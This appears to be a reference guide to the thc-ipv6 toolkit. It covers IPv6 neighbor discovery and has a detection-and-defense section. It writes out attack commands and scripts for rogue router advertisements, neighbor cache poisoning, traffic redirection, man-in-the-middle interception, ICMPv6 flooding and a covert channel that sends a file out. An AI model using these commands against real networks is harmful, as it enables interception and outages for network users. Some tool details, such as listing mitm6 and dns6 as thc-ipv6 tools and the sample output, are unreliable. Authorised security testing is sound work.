---
title: "thc-ipv6 — Complete IPv6 Attack and Discovery Toolkit"
description: "Perform IPv6 neighbor discovery, router attacks, MITM6, and DNS manipulation using a comprehensive IPv6 attack toolkit."
mitre_tactic: discovery
mitre_tactic_id: TA0007
mitre_subcategory: remote_system_discovery
categories:
  - ipv6
  - network-discovery
  - attack-toolkit
tags:
  - ipv6
  - neighbor-discovery
  - mitm
  - router-attack
  - dns6
install_command: "sudo apt install thc-ipv6"
version: "3.8-1"
github_repo: "https://github.com/vanhauser-thc/thc-ipv6"
kali_tools_page: "https://www.kali.org/tools/thc-ipv6/"
difficulty_level: advanced
requires_root: true
gui_available: false
related_tools:
  - ndisc6
  - ipv6calc
  - mitm6
---

# thc-ipv6 — Complete IPv6 Attack and Discovery Toolkit

## 1. Introduction

**thc-ipv6** is a comprehensive IPv6 attack and discovery toolkit containing over 40 tools for testing IPv6 security. It covers neighbor discovery, router attacks, man-in-the-middle attacks, DoS, DNS manipulation, and more.

**Use cases:**
- IPv6 neighbor discovery and enumeration
- Rogue router advertisement attacks
- Man-in-the-middle attacks via IPv6
- DNS server manipulation (dns6)
- IPv6 DoS testing
- IPv6 network reconnaissance

**Key tools in thc-ipv6:**
- `discover6`: Discover IPv6 hosts on the network
- `fake_router6`: Advertise rogue routers
- `redir6`: Redirect traffic through malicious router
- `parasite6`: Neighbor discovery spoofing
- `mitm6`: Man-in-the-middle via IPv6
- `doser6`: IPv6 denial of service
- `dns6`: DNS manipulation for IPv6

**Warning:** thc-ipv6 contains powerful attack tools. Use only on networks you own or have explicit authorization to test. Unauthorized use is illegal.

---

## 2. Installation

**Install via apt:**
```bash
sudo apt install thc-ipv6
```

**Verify installation:**
```bash
thc-ipv6 --help
```

**Permissions:** All thc-ipv6 tools require root to send and receive raw IPv6 packets.

**Dependencies:**
- libpcap
- libnet
- IPv6-enabled kernel

---

## 3. Core Concepts

### 3.1 IPv6 Neighbor Discovery

IPv6 replaces ARP with Neighbor Discovery Protocol (NDP). NDP uses ICMPv6 messages for:
- **Router Solicitation (RS)**: Host asks for router information
- **Router Advertisement (RA)**: Router announces its presence
- **Neighbor Solicitation (NS)**: Like ARP "who-has"
- **Neighbor Advertisement (NA)**: Like ARP reply

### 3.2 Link-Local Addresses

IPv6 link-local addresses (fe80::/10) are automatically configured on all interfaces. They enable neighbor discovery without any configuration.

### 3.3 Stateful vs Stateless Configuration

- **SLAAC (Stateless)**: Hosts configure themselves using Router Advertisements
- **DHCPv6 (Stateful)**: Hosts get addresses from a DHCPv6 server
- **Privacy Extensions**: Randomized interface identifiers

### 3.4 IPv6 Attack Vectors

| Attack | Tool | Description |
|--------|------|-------------|
| Rogue router | fake_router6 | Advertise as default router |
| Traffic redirect | redir6 | Redirect traffic to attacker |
| Neighbor spoofing | parasite6 | Spoof neighbor cache entries |
| Man-in-the-middle | mitm6 | Intercept IPv6 traffic |
| DNS manipulation | dns6 | Redirect DNS queries |
| DoS | doser6 | Flood target with ICMPv6 |

---

## 4. Command Reference

### Basic Usage

```bash
# Discover IPv6 hosts
sudo discover6 eth0

# Show all tools
thc-ipv6 --help

# Get help for specific tool
fake_router6 --help
```

### Key Tools

| Tool | Description |
|------|-------------|
| `discover6` | Discover IPv6 hosts via neighbor discovery |
| `fake_router6` | Advertise rogue router advertisements |
| `redir6` | Redirect traffic through attacker |
| `parasite6` | Spoof neighbor discovery cache |
| `mitm6` | Man-in-the-middle via IPv6 |
| `doser6` | ICMPv6 flood for DoS |
| `dns6` | DNS server manipulation |
| `flood_router6` | Flood router advertisements |
| `flood_neighbor6` | Flood neighbor solicitations |
| `dump_dhcp6` | Capture DHCPv6 traffic |
| `covert_send6` | Covert data channel over IPv6 |
| `coverage6` | Check IPv6 coverage |
| `invite6` | Invite a host to connect |
| `nsense6` | Neighbor solicitation with spoofed source |
| `passive_discovery6` | Passive neighbor discovery |

### Common Flags

| Flag | Description |
|------|-------------|
| `-h` | Print help |
| `-i IFACE` | Network interface |
| `-d DELAY` | Delay between packets |
| `-v` | Verbose output |
| `-t TARGET` | Target address |
| `-s SOURCE` | Source address |
| `-a` | Automatic mode |
| `-x` | Hex mode |

---

## 5. Examples

### Basic

**Discover IPv6 hosts:**
```bash
sudo discover6 eth0
```
Output:
```
Discovered addresses:
fe80::1 (08:00:27:a1:b2:c3)
fe80::2 (00:50:56:c0:00:08)
fe80::250:56ff:fec0:8 (00:50:56:c0:00:08)
```

**List all tools:**
```bash
thc-ipv6 --help
```

### Intermediate

**Passive neighbor discovery:**
```bash
sudo passive_discovery6 eth0
```
Listens for NDP traffic without sending anything.

**Capture DHCPv6:**
```bash
sudo dump_dhcp6 eth0
```

**Check IPv6 coverage:**
```bash
sudo coverage6 eth0 2001:db8::/32
```

### Advanced

**Rogue router advertisement:**
```bash
sudo fake_router6 eth0 2001:db8:dead:beef::1
```
Advertises a rogue router on the network.

**Traffic redirection:**
```bash
sudo redir6 eth0 target_mac fake_mac
```

**Man-in-the-middle:**
```bash
sudo mitm6 eth0
```
Intercepts IPv6 traffic by spoofing router advertisements.

**Neighbor cache poisoning:**
```bash
sudo parasite6 eth0
```
Responds to all neighbor solicitations, poisoning neighbor caches.

### Real-World

**IPv6 network audit:**
```bash
#!/bin/bash
INTERFACE="eth0"

echo "=== IPv6 Host Discovery ==="
sudo discover6 $INTERFACE

echo "=== Passive Discovery ==="
sudo passive_discovery6 -v $INTERFACE 2>&1 | head -20

echo "=== DHCPv6 Capture ==="
sudo dump_dhcp6 $INTERFACE &
DHC_PID=$!
sleep 30
kill $DHC_PID 2>/dev/null
```

**IPv6 MITM test:**
```bash
#!/bin/bash
INTERFACE="eth0"
TARGET="fe80::250:56ff:fec0:8%eth0"

echo "Starting MITM6 attack..."
sudo mitm6 $INTERFACE &
MITM_PID=$!

# Wait for traffic
sleep 60

# Stop attack
kill $MITM_PID 2>/dev/null
echo "MITM6 test complete"
```

**Rogue router test:**
```bash
#!/bin/bash
INTERFACE="eth0"
FAKE_GW="2001:db8:cafe::1"

echo "Advertising rogue router: $FAKE_GW"
sudo fake_router6 $INTERFACE $FAKE_GW -t 0 -r 0 -m 128

# Monitor for victims
sudo passive_discovery6 $INTERFACE -v 2>&1 | grep -i "router solicitation"
```

---

## 6. Advanced

### 6.1 Tool Combinations

**Full IPv6 attack chain:**
```bash
# 1. Discover hosts
sudo discover6 eth0

# 2. Passively learn addresses
sudo passive_discovery6 eth0 -v

# 3. MITM with rogue router
sudo fake_router6 eth0 2001:db8:evil::1

# 4. Intercept DNS
sudo dns6 eth0

# 5. Redirect traffic
sudo redir6 eth0 victim_mac attacker_mac
```

### 6.2 Attack Scenarios

**Scenario 1: IPv6 MITM**
```bash
# Advertise rogue router
sudo fake_router6 eth0 2001:db8:evil::1

# Capture DNS
sudo dns6 eth0

# Redirect to attacker
sudo redir6 eth0 victim_mac attacker_mac
```

**Scenario 2: DoS Testing**
```bash
# Flood neighbor solicitations
sudo flood_neighbor6 eth0 target_address

# Flood router advertisements
sudo flood_router6 eth0
```

**Scenario 3: Covert Channel**
```bash
# Sender
sudo covert_send6 eth0 target_address secret_data.bin

# Receiver
sudo covert_recv6 eth0
```

### 6.3 Scripting

**Automated IPv6 audit:**
```bash
#!/bin/bash
INTERFACE="$1"
OUTPUT="ipv6_audit_$(date +%F).txt"

echo "IPv6 Audit - $(date)" > "$OUTPUT"

echo "Discovering hosts..." >> "$OUTPUT"
sudo discover6 $INTERFACE >> "$OUTPUT" 2>&1

echo "Passive discovery..." >> "$OUTPUT"
sudo timeout 60 passive_discovery6 $INTERFACE >> "$OUTPUT" 2>&1

echo "Audit complete: $OUTPUT"
```

### 6.4 Integration with Other Tools

**thc-ipv6 + ndisc6:**
```bash
# thc-ipv6 for attack
sudo fake_router6 eth0 2001:db8:evil::1

# ndisc6 for verification
ndisc6 -1 fe80::1%eth0
```

**thc-ipv6 + tcpdump:**
```bash
# Capture ICMPv6 during attack
sudo tcpdump -i eth0 icmp6 -w ipv6_attack.pcap &

# Run attack
sudo fake_router6 eth0 2001:db8:evil::1
```

---

## 7. Detection and Defense

### 7.1 Detection

**Monitor ICMPv6 traffic:**
```bash
sudo tcpdump -i eth0 icmp6 -n -c 100
```

**Detect rogue router advertisements:**
```bash
sudo tcpdump -i eth0 'icmp6[icmp6type] == 134' -n
```
RA type 134 = Router Advertisement.

**Neighbor solicitation floods:**
```bash
sudo tcpdump -i eth0 'icmp6[icmp6type] == 135' -n | \
    awk '{count[$3]++} END {for (ip in count) if (count[ip]>10) print ip, count[ip]}'
```

### 7.2 Defense

**Disable IPv6 if not needed:**
```bash
sudo sysctl -w net.ipv6.conf.all.disable_ipv6=1
sudo sysctl -w net.ipv6.conf.default.disable_ipv6=1
```

**RA Guard (switch feature):**
Enable RA Guard on managed switches to block unauthorized Router Advertisements.

**SeND (Secure Neighbor Discovery):**
Enable SEND with CGA (Cryptographically Generated Addresses) for authenticated NDP.

**Static NDP entries:**
```bash
sudo ip -6 neigh add fe80::1 lladdr 08:00:27:a1:b2:c3 dev eth0
```

**IPv6 firewall:**
```bash
# Block ICMPv6 RA from external sources
sudo ip6tables -A INPUT -p icmpv6 --icmpv6-type 134 -i eth1 -j DROP
```

**First-Hop Security:**
- RA Guard
- DHCPv6 Guard
- ND Inspection
- SEND

---

## 8. Troubleshooting

### 8.1 Common Issues

**"No IPv6 address on interface":**
```bash
ip -6 addr show
sudo ip -6 addr add 2001:db8::1/64 dev eth0
```

**"No such device":**
```bash
ip -br link show
sudo discover6 eth0
```

**"Permission denied":**
```bash
sudo discover6 eth0
```
All tools require root.

**No hosts discovered:**
- Check IPv6 is enabled: `ip -6 addr show`
- Try passive mode: `sudo passive_discovery6 eth0`
- Verify interface: `ip link show eth0`

### 8.2 Performance Issues

**Slow discovery:**
```bash
sudo discover6 eth0 -d 100
```
Adjust delay between packets.

**Too many results:**
```bash
sudo passive_discovery6 eth0 -v 2>&1 | grep "fe80" | head -20
```
Filter output for relevant results.

### 8.3 IPv6 Configuration Issues

**Enable IPv6:**
```bash
sudo sysctl -w net.ipv6.conf.all.disable_ipv6=0
sudo sysctl -w net.ipv6.conf.default.disable_ipv6=0
```

**Link-local address not present:**
```bash
sudo ip link set eth0 up
sudo ip -6 addr show dev eth0
```
Link-local addresses are auto-generated when interface is up.

---

## Resources

- [thc-ipv6 GitHub](https://github.com/vanhauser-thc/thc-ipv6)
- [thc-ipv6 documentation](https://thc-ipv6.org/)
- [Kali thc-ipv6 tool page](https://www.kali.org/tools/thc-ipv6/)
- [IPv6 Neighbor Discovery (RFC 4861)](https://tools.ietf.org/html/rfc4861)
- [IPv6 Security (RFC 7113)](https://tools.ietf.org/html/rfc7113)
- [SEND Protocol (RFC 3971)](https://tools.ietf.org/html/rfc3971)
